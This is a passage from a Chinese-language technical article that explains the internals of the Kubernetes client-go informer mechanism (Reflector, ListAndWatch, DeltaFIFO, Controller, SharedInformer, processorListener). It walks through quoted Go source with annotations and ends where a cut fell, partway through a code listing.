controller开发时，对以下几点进行定制开发：  informer的resource event handler处理 对workqueue的入队和出队操作处理 如果业务需要，对resource的本地存储操作 controller自身的业务层逻辑处理  informer类图 Informer 这里介绍常用的SharedInformer\n不难看出Shared指的是多个listeners共享同一个cache，而且资源的变化会同时通知到cache和listeners。这个解释和上面图所展示的内容的是一致的，cache我们在Indexer的介绍中已经分析过了，listerners指的就是OnAdd、OnUpdate、OnDelete这些回调函数背后的对象，本文就要对Informer进行系统性的分析。我们先对上面的图做一些初步的认识：\n List/Watch：List是列举apiserver中对象的接口，Watch是监控apiserver资源变化的接口； Reflector：反射器，实现对apiserver指定类型对象的监控，其中反射实现的就是把监控的结果实例化成具体的对象； DeltaIFIFO：将Reflector监控的变化的对象形成一个FIFO队列，此处的Delta就是变化 LocalStore：指的就是Indexer的实现cache，这里面缓存的就是apiserver中的对象(其中有一部分可能还在DeltaFIFO中)，此时使用者再查询对象的时候就直接从cache中查找，减少了apiserver的压力； Callbacks：通知回调函数，Infomer感知的所有对象变化都是通过回调函数通知使用者(Listener)，即event_handler处理；  ListerWatcher ListerWatcher是一个interface类型 client-go/tools/cache/listwatch.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  // ListerWatcher is any object that knows how to perform an initial list and start a watch on a resource. type ListerWatcher interface { // List should return a list type object; the Items field will be extracted, and the  // ResourceVersion field will be used to start the watch in the right place.  List(options metav1.ListOptions) (runtime.Object, error) // Watch should begin a watch at the specified version.  Watch(options metav1.ListOptions) (watch.Interface, error) } // ListFunc knows how to list resources type ListFunc func(options metav1.ListOptions) (runtime.Object, error) // WatchFunc knows how to watch resources type WatchFunc func(options metav1.ListOptions) (watch.Interface, error) // ListWatch knows how to list and watch a set of apiserver resources. It satisfies the ListerWatcher interface. // It is a convenience function for users of NewReflector, etc. // ListFunc and WatchFunc must not be nil type ListWatch struct { ListFunc ListFunc WatchFunc WatchFunc // DisableChunking requests no chunking for this list watcher. It has no effect in Kubernetes 1.8, but in  // 1.9 will allow a controller to opt out of chunking.  DisableChunking bool }   需要注意一点：ListerWatcher是针对某一类对象的，比如Pod，不是所有对象的，这个在构造ListerWatcher对象的时候由apiserver的client类型决定了。\nReflector 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  // 代码源自client-go/tools/cache/reflector.go type Reflector struct { name string // 名字  metrics *reflectorMetrics // 但凡遇到metrics多半是用于做监控的，可以忽略  expectedType reflect.Type // 反射的类型，也就是要监控的对象类型，比如Pod  store Store // 存储，就是DeltaFIFO，为什么，后面会有代码证明  listerWatcher ListerWatcher // 这个是用来从apiserver获取资源用的  period time.Duration // 反射器在List和Watch的时候理论上是死循环，只有出现错误才会退出  // 这个变量用在出错后多长时间再执行List和Watch，默认值是1秒钟  resyncPeriod time.Duration // 重新同步的周期，很多人肯定认为这个同步周期指的是从apiserver的同步周期  // 其实这里面同步指的是shared_informer使用者需要定期同步全量对象  ShouldResync func() bool // 如果需要同步，调用这个函数问一下，当然前提是该函数指针不为空  clock clock.Clock // 时钟  lastSyncResourceVersion string // 最后一次同步的资源版本  lastSyncResourceVersionMutex sync.RWMutex // 还专门为最后一次同步的资源版本弄了个锁 }    listerWatcher用于获取和监控资源，lister可以获取对象的全量，watcher可以获取对象的增量(变化)； 系统会周期性的执行list-watch的流程，一旦过程中失败就要重新执行流程，这个重新执行的周期就是period指定的； expectedType规定了监控对象的类型，非此类型的对象将会被忽略； 实例化后的expectedType类型的对象会被添加到store中； kubernetes资源在apiserver中都是有版本的，对象的任何除了修改(添加、删除、更新)都会造成资源版本更新，所以lastSyncResourceVersion就是指的这个版本； 如果使用者需要定期同步全量对象，那么Reflector就会定期产生全量对象的同步事件给DeltaFIFO;  Run Reflector有一个Run()函数，这个是Reflector的核心功能流程\n1 2 3 4 5 6 7 8 9 10 11 12  // 代码源自client-go/tools/cache/reflector.go func (r *Reflector) Run(stopCh \u0026lt;-chan struct{}) { // func Until(f func(), period time.Duration, stopCh \u0026lt;-chan struct{})是下面函数的声明  // 这里面我们不用关心wait.Until是如何实现的，只要知道他调用函数f会被每period周期执行一次  // 意思就是f()函数执行完毕再等period时间后在执行一次，也就是r.ListAndWatch()会被周期性的调用  wait.Until(func() { if err := r.ListAndWatch(stopCh); err != nil { utilruntime.HandleError(err) } }, r.period, stopCh) }   ListAndWatch 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147  // 代码源自client-go/tools/cache/reflector.go func (r *Reflector) ListAndWatch(stopCh \u0026lt;-chan struct{}) error { var resourceVersion string // 很多存储类的系统都是这样设计的，数据采用版本的方式记录，数据每变化(添加、删除、更新)都会触发版本更新，  // 这样的做法可以避免全量数据访问。以apiserver资源监控为例，只要监控比缓存中资源版本大的对象就可以了，  // 把变化的部分更新到缓存中就可以达到与apiserver一致的效果，一般资源的初始版本为0，从0版本开始列举就是全量的对象了  // 1. 从版本号0 开始list，List()可以从缓存中提供，并且可能会相对于etcd内容延迟。  // 最终，由watch进行监听更新  options := metav1.ListOptions{ResourceVersion: \u0026#34;0\u0026#34;} // 与监控相关的内容不多解释  r.metrics.numberOfLists.Inc() start := r.clock.Now() // 列举资源，这部分是apimachery相关的内容，读者感兴趣可以自己了解  list, err := r.listerWatcher.List(options) if err != nil { return fmt.Errorf(\u0026#34;%s: Failed to list %v: %v\u0026#34;, r.name, r.expectedType, err) } // 还是监控相关的  r.metrics.listDuration.Observe(time.Since(start).Seconds()) // 下面的代码主要是利用apimachinery相关的函数实现，就是把列举返回的结果转换为对象数组  // 下面的代码大部分来自apimachinery，此处不做过多说明，读者只要知道实现什么功能就行了  listMetaInterface, err := meta.ListAccessor(list) if err != nil { return fmt.Errorf(\u0026#34;%s: Unable to understand list result %#v: %v\u0026#34;, r.name, list, err) } // 2. 根据listMeta ResourceVersion的版本号，决定从哪里开始watch  resourceVersion = listMetaInterface.GetResourceVersion() // 3. 将资源数据转换成资源列表 runtime.Object -\u0026gt; []runtime.Object  items, err := meta.ExtractList(list) if err != nil { return fmt.Errorf(\u0026#34;%s: Unable to understand list result %#v (%v)\u0026#34;, r.name, list, err) } // 和监控相关的内容  r.metrics.numberOfItemsInList.Observe(float64(len(items))) // 以上部分都是对象实例化的过程，可以称之为反射，也是Reflector这个名字的主要来源，本文不是讲解反射原理的，  // 而是作为SharedInformer的前端，所以我们重点介绍的是对象在SharedInformer中流转过程，所以反射原理部分不做为重点讲解  // 这可是真正从apiserver同步过来的全量对象，所以要同步到DeltaFIFO中  // 4. 将资源对象列表和资源版本号 以r.store.Replace方式存储到DeltaFIFO中  if err := r.syncWith(items, resourceVersion); err != nil { return fmt.Errorf(\u0026#34;%s: Unable to sync list result: %v\u0026#34;, r.name, err) } // 设置最新的同步的对象版本  // 5. 设置最新的资源版本号  r.setLastSyncResourceVersion(resourceVersion) // 下面要启动一个后台协程实现定期的同步操作，这个同步就是将SharedInformer里面的对象全量以同步事件的方式通知使用者  // 我们暂且称之为“后台同步协程”，Run()函数退出需要后台同步协程退出，所以下面的cancelCh就是干这个用的  // 利用defer close(cancelCh)实现的，而resyncerrc是后台同步协程反向通知Run()函数的报错通道  // 当后台同步协程出错，Run()函数接收到信号就可以退出了  resyncerrc := make(chan error, 1) cancelCh := make(chan struct{}) defer close(cancelCh) // 下面这个匿名函数就是后台同步协程的函数了  // 6. 开启Resync协程： 根据ShouldResync标识，重新同步处理store.Resync()  // 这个同步Resync，不是从apiserver中获取，而是从indexer cache的resync处理  go func() { // resyncCh返回的就是一个定时器，如果resyncPeriod这个为0那么就会返回一个永久定时器，cleanup函数是用来清理定时器的  resyncCh, cleanup := r.resyncChan() defer func() { cleanup() }() // 死循环等待各种信号  for { // 只有定时器有信号才继续处理，其他的都会退出  // 注意case \u0026lt;-resyncCh 定时同步分支，没有return，会继续执行r.store.Resync()处理  select { case \u0026lt;-resyncCh: case \u0026lt;-stopCh: return case \u0026lt;-cancelCh: return } // ShouldResync是个函数地址，创建反射器对象的时候传入，即便时间到了，也要通过函数问问是否需要同步  if r.ShouldResync == nil || r.ShouldResync() { // 我们知道这个store是DeltaFIFO，DeltaFIFO.Resync(): 把knownObjects的objs同步更新到delta_fifo中  // 就在这里实现了我们前面提到的同步，从这里看所谓的同步就是以全量对象同步事件的方式通知使用者  if err := r.store.Resync(); err != nil { resyncerrc \u0026lt;- err return } } // 清理掉当前的计时器，获取下一个同步时间定时器  cleanup() resyncCh, cleanup = r.resyncChan() } }() // 前面已经列举了全量对象，接下来就是watch的逻辑了  // 7. 从 资源版本号resourceVersion 开始进行watch处理  for { // 如果有退出信号就立刻返回，否则就会往下走，因为有default.  select { case \u0026lt;-stopCh: return nil default: } // 计算watch的超时时间  timeoutSeconds := int64(minWatchTimeout.Seconds() * (rand.Float64() + 1.0)) // 设置watch的选项，因为前期列举了全量对象，从这里只要监听最新版本以后的资源就可以了  // 如果没有资源变化总不能一直挂着吧？也不知道是卡死了还是怎么了，所以有一个超时会好一点  options = metav1.ListOptions{ ResourceVersion: resourceVersion, TimeoutSeconds: \u0026amp;timeoutSeconds, } // 监控相关  r.metrics.numberOfWatches.Inc() // 开始监控对象  // 7.1 watch函数阻塞处理，返回w，即监控事件流ResultChan  w, err := r.listerWatcher.Watch(options) // watch产生错误了，大部分错误就要退出函数然后再重新来一遍流程  if err != nil { switch err { case io.EOF: case io.ErrUnexpectedEOF: default: utilruntime.HandleError(fmt.Errorf(\u0026#34;%s: Failed to watch %v: %v\u0026#34;, r.name, r.expectedType, err)) } // 类似于网络拒绝连接的错误要等一会儿再试，因为可能网络繁忙  if urlError, ok := err.(*url.Error); ok { if opError, ok := urlError.Err.(*net.OpError); ok { if errno, ok := opError.Err.(syscall.Errno); ok \u0026amp;\u0026amp; errno == syscall.ECONNREFUSED { time.Sleep(time.Second) continue } } } return nil } // watch返回是流，apiserver会将变化的资源通过这个流发送出来，client-go最终通过chan实现的  // 所以watchHandler()是一个需要持续从chan读取数据的流程，所以需要传入resyncerrc和stopCh  // 用于异步通知退出或者后台同步协程错误  // 7.2 watch 事件处理  // Added EventType = \u0026#34;ADDED\u0026#34;  // Modified EventType = \u0026#34;MODIFIED\u0026#34;  // Deleted EventType = \u0026#34;DELETED\u0026#34;  // Error EventType = \u0026#34;ERROR\u0026#34;  if err := r.watchHandler(w, \u0026amp;resourceVersion, resyncerrc, stopCh); err != nil { if err != errorStopRequested { glog.Warningf(\u0026#34;%s: watch of %v ended with: %v\u0026#34;, r.name, r.expectedType, err) } return nil } } }   上面的函数中，调用了两个私有函数，分别为syncWith()和watchHandler()。syncWith()用于实现一次从apiserver全量对象的同步，这里的同步和我们上面提到的同步不是一回事，这里指的是从apiserver的同步。watchHandler是实现监控apiserver资源变化的处理过程，主要就是把apiserver的资源变化转换为DeltaFIFO调用。我们接下来就看这两个函数的具体实现\n接下来我们就要看看watchHandler做了什么？\nsyncWith和watchHandler 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96  // 代码源自client-go/tools/cache/reflector.go // 实现apiserver全量对象的同步 func (r *Reflector) syncWith(items []runtime.Object, resourceVersion string) error { // 做一次slice类型转换  found := make([]interface{}, 0, len(items)) for _, item := range items { found = append(found, item) } // 直接调用了DeltaFIFO的Replace()接口，这个接口就是用于同步全量对象的  return r.store.Replace(found, resourceVersion) } // 实现从watch返回的chan中持续读取变化的资源，并转换为DeltaFIFO相应的调用 func (r *Reflector) watchHandler(w watch.Interface, resourceVersion *string, errc chan error, stopCh \u0026lt;-chan struct{}) error { start := r.clock.Now() eventCount := 0 // 监控相关  defer func() { r.metrics.numberOfItemsInWatch.Observe(float64(eventCount)) r.metrics.watchDuration.Observe(time.Since(start).Seconds()) }() // 这里就开始无限循环的从chan中读取资源的变化，也可以理解为资源的增量变化，同时还要监控各种信号 loop: for { select { // 系统退出信号  case \u0026lt;-stopCh: return errorStopRequested // 后台同步协程出错信号  case err := \u0026lt;-errc: return err // watch函数返回的是一个chan，通过这个chan持续的读取对象  case event, ok := \u0026lt;-w.ResultChan(): // 如果不OK，说明chan关闭了，就要重新获取，这里面我们可以推测这个chan可能会运行过程中重新创建  // 否则就应该退出而不是继续循环  if !ok { break loop } // 看来event可以作为错误的返回值，挺有意思，而不是通过关闭chan，这种方式可以传递错误信息，关闭chan做不到  if event.Type == watch.Error { return apierrs.FromObject(event.Object) } // 这里面就是利用反射实例化对象了，而且判断了对象类型是我们设定的类型  if e, a := r.expectedType, reflect.TypeOf(event.Object); e != nil \u0026amp;\u0026amp; e != a { utilruntime.HandleError(fmt.Errorf(\u0026#34;%s: expected type %v, but watch event object had type %v\u0026#34;, r.name, e, a)) continue } // 和list操作相似，也要获取对象的版本，要更新缓存中的版本，下次watch就可以忽略这些资源了  meta, err := meta.Accessor(event.Object) if err != nil { utilruntime.HandleError(fmt.Errorf(\u0026#34;%s: unable to understand watch event %#v\u0026#34;, r.name, event)) continue } newResourceVersion := meta.GetResourceVersion() // 根据事件的类型做不同的DeltaFIFO的操作  switch event.Type { // 向DeltaFIFO添加一个添加的Delta  case watch.Added: err := r.store.Add(event.Object) if err != nil { utilruntime.HandleError(fmt.Errorf(\u0026#34;%s: unable to add watch event object (%#v) to store: %v\u0026#34;, r.name, event.Object, err)) } // 更新对象，向DeltaFIFO添加一个更新的Delta  case watch.Modified: err := r.store.Update(event.Object) if err != nil { utilruntime.HandleError(fmt.Errorf(\u0026#34;%s: unable to update watch event object (%#v) to store: %v\u0026#34;, r.name, event.Object, err)) } // 删除对象，向DeltaFIFO添加一个删除的Delta  case watch.Deleted: err := r.store.Delete(event.Object) if err != nil { utilruntime.HandleError(fmt.Errorf(\u0026#34;%s: unable to delete watch event object (%#v) from store: %v\u0026#34;, r.name, event.Object, err)) } // 其他类型就不知道干什么了，只能报错  default: utilruntime.HandleError(fmt.Errorf(\u0026#34;%s: unable to understand watch event %#v\u0026#34;, r.name, event)) } // 更新最新资源版本  *resourceVersion = newResourceVersion r.setLastSyncResourceVersion(newResourceVersion) eventCount++ } } // watch返回时间非常短而且没有任何事件要处理，这个属于异常现象，因为我们watch是设置了超时的  watchDuration := r.clock.Now().Sub(start) if watchDuration \u0026lt; 1*time.Second \u0026amp;\u0026amp; eventCount == 0 { r.metrics.numberOfShortWatches.Inc() return fmt.Errorf(\u0026#34;very short watch: %s: Unexpected watch close - watch lasted less than a second and no items received\u0026#34;, r.name) } return nil }   resyncChan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  // 代码源自client-go/tools/cache/reflector.go func (r *Reflector) setLastSyncResourceVersion(v string) { // 设置已经获取到资源的最新版本  r.lastSyncResourceVersionMutex.Lock() defer r.lastSyncResourceVersionMutex.Unlock() r.lastSyncResourceVersion = v rv, err := strconv.Atoi(v) if err == nil { r.metrics.lastResourceVersion.Set(float64(rv)) } } // 获取resync定时器，叫定时器比较好理解，叫chan很难和定时关联起来 func (r *Reflector) resyncChan() (\u0026lt;-chan time.Time, func() bool) { // 如果resyncPeriod说明就不用定时同步，返回的是永久超时的定时器  if r.resyncPeriod == 0 { return neverExitWatch, func() bool { return false } } // 构建定时起  t := r.clock.NewTimer(r.resyncPeriod) return t.C(), t.Stop }   说明  Reflector利用apiserver的client列举全量对象(版本为0以后的对象全部列举出来) 将全量对象采用Replace()接口同步到DeltaFIFO中，并且更新资源的版本号，这个版本号后续会用到； 开启一个协程定时执行resync，如果没有设置定时同步则不会执行，同步就是把全量对象以同步事件的方式通知出去；注意：这个resync操作不是跟apiserver的交互操作 通过apiserver的client监控(watch)资源，监控的当前资源版本号以后的对象，因为之前的都已经获取到了； 一旦有对象发生变化，那么就会根据变化的类型(新增、更新、删除)调用DeltaFIFO的相应接口，产生一个相应的对象Delta，同时更新当前资源的版本；  Controller 这里的controller定义在client-go/tools/cache/controller.go中，目的是用来把Reflector、DeltaFIFO组合起来形成一个相对固定的、标准的处理流程。理解了Controller，基本就算把SharedInfomer差不多搞懂了。\n实际上informer本质上就是个controller\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  // 代码源自client-go/tools/cache/controller.go // 这是一个Controller的抽象 type Controller interface { Run(stopCh \u0026lt;-chan struct{}) // 核心流程函数  HasSynced() bool // apiserver中的对象是否已经同步到了Store中  LastSyncResourceVersion() string // 最新的资源版本号 } type Config struct { Queue // SharedInformer使用DeltaFIFO  ListerWatcher // 这个用来构造Reflector  Process ProcessFunc // 这个在调用DeltaFIFO.Pop()使用，弹出对象要如何处理  ObjectType runtime.Object // 对象类型，这个肯定是Reflector使用  FullResyncPeriod time.Duration // 全量同步周期，这个在Reflector使用  ShouldResync ShouldResyncFunc // Reflector在全量更新的时候会调用该函数询问  RetryOnError bool // 错误是否需要尝试 }   从上面的定义来看，HasSynced()可调用DeltaFIFO. HasSynced()实现，LastSyncResourceVersion()可以通过Reflector实现。因为Controller把多个模块整合起来实现了一套业务逻辑，所以在创建Controller需要提供一些配置\n从上面两个类型的定义我们可以猜测：Controller自己构造Reflector获取对象，Reflector作为DeltaFIFO生产者持续监控apiserver的资源变化并推送到队列中。Controller的Run()应该是队列的消费者，从队列中弹出对象并调用Process()处理。所以Controller相比于Reflector因为队列的加持表现为每次有资源变化就会调用一次使用者定义的处理函数。\n流程处理 Run  NewReflector，Reflector生产者，进行obj入队操作 processLoop，是消费者，进行obj出队和存储操作  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  // 代码源自client-go/tools/cache/controller.go // controller是Controller的实现类型 type controller struct { config Config // 配置，上面有讲解  reflector *Reflector // 反射器  reflectorMutex sync.RWMutex // 反射器的锁  clock clock.Clock // 时钟 } // 核心业务逻辑实现 func (c *controller) Run(stopCh \u0026lt;-chan struct{}) { defer utilruntime.HandleCrash() // 创建一个协程，如果收到系统退出的信号就关闭队列，相当于在这里析构的队列  go func() { \u0026lt;-stopCh c.config.Queue.Close() }() // 创建Reflector  r := NewReflector( c.config.ListerWatcher, c.config.ObjectType, c.config.Queue, c.config.FullResyncPeriod, ) // r.ShouldResync的存在就是为了以后使用少些一点代码？否则直接使用c.config.ShouldResync不就完了么？不明白用意  r.ShouldResync = c.config.ShouldResync r.clock = c.clock // 记录反射器  c.reflectorMutex.Lock() c.reflector = r c.reflectorMutex.Unlock() // wait.Group不是本章的讲解内容，只要把它理解为类似barrier就行了  // 被他管理的所有的协程都退出后调用Wait()才会退出，否则就会被阻塞  var wg wait.Group defer wg.Wait() // StartWithChannel()会启动协程执行Reflector.Run()，同时接收到stopCh信号就会退出协程  wg.StartWithChannel(stopCh, r.Run) // wait.Until()在前面的章节讲过了，周期性的调用c.processLoop()，这里来看是1秒  // 不用担心调用频率太高，正常情况下c.processLoop是不会返回的，除非遇到了解决不了的错误，因为他是个循环  wait.Until(c.processLoop, time.Second, stopCh) }   processLoop 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  // 代码源自client-go/tools/cache/controller.go func (c *controller) processLoop() { for { // 从队列中弹出一个对象，然后处理它,这才是最主要的部分，这个c.config.Process是构造Controller的时候通过Config传进来的  // 所以这个读者要特别注意了，这个函数其实是ShareInformer传进来的，所以在分析SharedInformer的时候要重点分析的  // 核心处理逻辑实现在了Process函数中了  obj, err := c.config.Queue.Pop(PopProcessFunc(c.config.Process)) if err != nil { // 如果FIFO关闭了那就退出  if err == FIFOClosedError { return } // 如果错误可以再试试  if c.config.RetryOnError { c.config.Queue.AddIfNotPresent(obj) } } } }   HasSynced HasSynced 表示队列中的全量对象都已同步完成\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  // 代码源自client-go/tools/cache/controller.go  // Returns true once this controller has completed an initial resource listing func (c *controller) HasSynced() bool { return c.config.Queue.HasSynced() } // Return true if an Add/Update/Delete/AddIfNotPresent are called first, // or an Update called first but the first batch of items inserted by Replace() has been popped func (f *DeltaFIFO) HasSynced() bool { f.lock.Lock() defer f.lock.Unlock() // 这里就比较明白了，一次同步全量对象后，并且全部Pop()出去才能算是同步完成  // 其实这里所谓的同步就是全量内容已经进入Indexer，Indexer已经是系统中对象的全量快照了  return f.populated \u0026amp;\u0026amp; f.initialPopulationCount == 0 }   SharedInformer SharedInformer接口 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  // 代码源自client-go/tools/cache/shared_informer.go type SharedInformer interface { // 添加资源事件处理器，关于ResourceEventHandler的定义在下面  // 相当于注册回调函数，当有资源变化就会通过回调通知使用者，是不是能和上面介绍的Controller可以联系上了？  // 为什么是Add不是Reg，说明可以支持多个handler  AddEventHandler(handler ResourceEventHandler) // 上面添加的是不需要周期同步的处理器，下面的接口添加的是需要周期同步的处理器，周期同步上面提了好多遍了，不赘述  AddEventHandlerWithResyncPeriod(handler ResourceEventHandler, resyncPeriod time.Duration) // Store这个有专门的文章介绍，这个函数就是获取Store的接口,说明SharedInformer内有Store对象  GetStore() Store // Controller在上面的章节介绍了，说明SharedInformer内有Controller对象  GetController() Controller // 这个应该是SharedInformer的核心逻辑实现的地方  Run(stopCh \u0026lt;-chan struct{}) // 因为有Store，这个函数就是告知使用者Store里面是否已经同步了apiserver的资源，这个接口很有用  // 当创建完SharedInformer后，通过Reflector从apiserver同步全量对象，然后在通过DeltaFIFO一个一个的同志到cache  // 这个接口就是告知使用者，全量的对象是不是已经同步到了cache，这样就可以从cache列举或者查询了  HasSynced() bool // 最新同步资源的版本，这个就不多说了，通过Controller(Controller通过Reflector)实现  LastSyncResourceVersion() string } // 扩展了SharedInformer类型，从类型名字上看共享的是Indexer，Indexer也是一种Store的实现 type SharedIndexInformer interface { // 继承了SharedInformer  SharedInformer // 扩展了Indexer相关的接口  AddIndexers(indexers Indexers) error GetIndexer() Indexer } // 代码源自client-go/tools/cache/controller.go，SharedInformer使用者如果需要处理资源的事件 // 那么就要自己实现相应的回调函数 type ResourceEventHandler interface { // 添加对象回调函数  OnAdd(obj interface{}) // 更新对象回调函数  OnUpdate(oldObj, newObj interface{}) // 删除对象回调函数  OnDelete(obj interface{}) }   sharedIndexInformer类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  // 代码源自client-go/tools/cache/shared_informer.go type sharedIndexInformer struct { // Indexer也是一种Store，这个我们知道的，Controller负责把Reflector和FIFO逻辑串联起来  // 所以这两个变量就涵盖了开篇那张图里面的Reflector、DeltaFIFO和LocalStore(cache)  indexer Indexer controller Controller // sharedIndexInformer把上面提到的ResourceEventHandler进行了在层封装，并统一由sharedProcessor管理，后面章节专门介绍  processor *sharedProcessor // CacheMutationDetector其实没啥用，我理解是开发者自己实现的一个调试工具，用来发现对象突变的  // 实现方法也比较简单，DeltaFIFO弹出的对象在处理前先备份(深度拷贝)一份，然后定期比对两个对象是否相同  // 如果不同那就报警，说明处理过程中有人修改过对象，这个功能默认是关闭，所以我说没啥用  cacheMutationDetector CacheMutationDetector // 这两个变量是给Reflector用的，我们知道Reflector是在Controller创建的  listerWatcher ListerWatcher objectType runtime.Object // 定期同步的周期，因为可能存在多个ResourceEventHandler，就有可能存在多个同步周期，sharedIndexInformer采用最小的周期  // 这个周期值就存储在resyncCheckPeriod中，通过AddEventHandler()添加的处理器都采用defaultEventHandlerResyncPeriod  resyncCheckPeriod time.Duration defaultEventHandlerResyncPeriod time.Duration // 时钟  clock clock.Clock // 启动、停止标记，肯定有人会问为啥用两个变量，一个变量不就可以实现启动和停止了么？  // 其实此处是三个状态，启动前，已启动和已停止，start表示了两个状态，而且为启动标记专门做了个锁  // 说明启动前和启动后有互斥的资源操作  started, stopped bool startedLock sync.Mutex // 这个名字起的也是够了，因为DeltaFIFO每次Pop()的时候需要传入一个函数用来处理Deltas  // 处理Deltas也就意味着要把消息通知给处理器，如果此时调用了AddEventHandler()  // 就会存在崩溃的问题，所以要有这个锁，阻塞Deltas....细想名字也没毛病~  blockDeltas sync.Mutex }   CacheMutationDetector 【非重要，可忽略】 CacheMutationDetector这个就是检测对象在过程中突变的，何所谓突变呢？突变就是莫名其妙的修改了，如何实现突变检测，也是比较简单的。CacheMutationDetector对所有的对象做了一次深度拷贝(DeepCopy)，然后定期比较两个对象是否一致，当发现有不同时说明对象突变了，然后就panic。我认为CacheMutationDetector是用来调试的，因为代码默认是关闭的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  // 代码源自client-go/tools/cache/mutation_detector.go // 默认关闭突变检测 var mutationDetectionEnabled = false // 但是可以通过环境变量的KUBE_CACHE_MUTATION_DETECTOR开启 func init() { mutationDetectionEnabled, _ = strconv.ParseBool(os.Getenv(\u0026#34;KUBE_CACHE_MUTATION_DETECTOR\u0026#34;)) } // 这个是突变检测的类型抽象 type CacheMutationDetector interface { AddObject(obj interface{}) // 用于记录所有的对象  Run(stopCh \u0026lt;-chan struct{}) // 开启协程定期比对 } // 创建CacheMutationDetector对象 func NewCacheMutationDetector(name string) CacheMutationDetector { // 如果没有开启选项就构造一个什么都不做的对象  if !mutationDetectionEnabled { return dummyMutationDetector{} } // 如果开启了选项，那么就构造一个默认的突变检测器  glog.Warningln(\u0026#34;Mutation detector is enabled, this will result in memory leakage.\u0026#34;) return \u0026amp;defaultCacheMutationDetector{name: name, period: 1 * time.Second} } // 这就是什么都不做的突变检测器 type dummyMutationDetector struct{} func (dummyMutationDetector) Run(stopCh \u0026lt;-chan struct{}) { } func (dummyMutationDetector) AddObject(obj interface{}) { }   sharedProcessor 有没有感觉shared这个词被kubernetes玩儿坏了(继controller之后有一个背玩儿坏的单词)，sharedProcessor这又shared啥了？首先需要知道Processor的定义，这里定义的Processor就是处理事件的东西。什么事件，就是SharedInformer向外部通知的事件。因为官方代码没有注释，我猜是shared是同一个SharedInformer，有没有很绕嘴？还有更绕的在后面呢，我们还要了解一个新的类型，那就是processorListener，processor刚说完，又来了个Listener！\n通过SharedInformer.AddEventHandler()添加的处理器最终就会封装成processorListener，然后通过sharedProcessor管理起来，通过processorListener的封装就可以达到所谓的有事处理，没事挂起。\nprocessorListener rocessorListener可以理解为两个核心功能，一个是processor，一个是listener，用一句话概括，有事做事没事挂起。先看看processorListener的定义：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  // 代码源自clien-go/tools/cache/shared_informer.go type processorListener struct { // nextCh、addCh、handler、pendingNotifications的用法请参看我的《golang的chan有趣用法》里面有相关的例子  // 总结这四个变量实现了事件的输入、缓冲、处理，事件就是apiserver资源的变化  nextCh chan interface{} addCh chan interface{} handler ResourceEventHandler pendingNotifications buffer.RingGrowing // 下面四个变量就是跟定时同步相关的了，requestedResyncPeriod是处理器设定的定时同步周期  // resyncPeriod是跟sharedIndexInformer对齐的同步时间，因为sharedIndexInformer管理了多个处理器  // 最终所有的处理器都会对齐到一个周期上，nextResync就是下一次同步的时间点  requestedResyncPeriod time.Duration resyncPeriod time.Duration nextResync time.Time resyncLock sync.Mutex }   我们需要知道就是processor如何接收事件(此处事件就是apiserver的资源变化，也就是DeltaFIFO输出的Deltas)？如何通知事件处理器？如何缓冲处理器？如何阻塞处理器进而形成listener的？一系列的问题我们需要沿着处理逻辑的流程逐一解释。第一个问题，事件是如何传入的:\n1 2 3 4 5  // 代码源自client-go/tools/cache/shared_informer.go // 对，就这么简单，通过addCh传入，这里面的notification就是我们所谓的事件 func (p *processorListener) add(notification interface{}) { p.addCh \u0026lt;- notification }   因为addCh是无缓冲chan，调用add()函数的人是事件分发器processor.distribute。意思就是从DeltaFIFO弹出的Deltas要要逐一送到多个处理器，此时如果处理器没有及时处理会造成addCh把分发器阻塞，那别的处理器也就同样无法收到新的事件了。这一点，processorListener利用一个后台协程处理这个问题(相应的原理参看《golang的chan有趣用法》)：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  // 代码源自client-go/tools/cache/shared_informer.go // 这个函数是通过sharedProcessor利用wait.Group启动的，读者可以自行查看wait.Group func (p *processorListener) pop() { defer utilruntime.HandleCrash() // nextCh是在这里，函数退出前析构的  defer close(p.nextCh) // 临时变量，下面会用到  var nextCh chan\u0026lt;- interface{} var notification interface{} // 进入死循环啦  for { select { // 有两种情况，nextCh还没有初始化，这个语句就会被阻塞，这个我在《深入浅出golang之chan》说过  // nextChan后面会赋值为p.nextCh，因为p.nextCh也是无缓冲的chan，数据不发送成功就阻塞  case nextCh \u0026lt;- notification: // 如果发送成功了，那就从缓冲中再取一个事件出来  var ok bool notification, ok = p.pendingNotifications.ReadOne() if !ok { // 如果没有事件，那就把nextCh再次设置为nil，接下来对于nextCh操作还会被阻塞  nextCh = nil } // 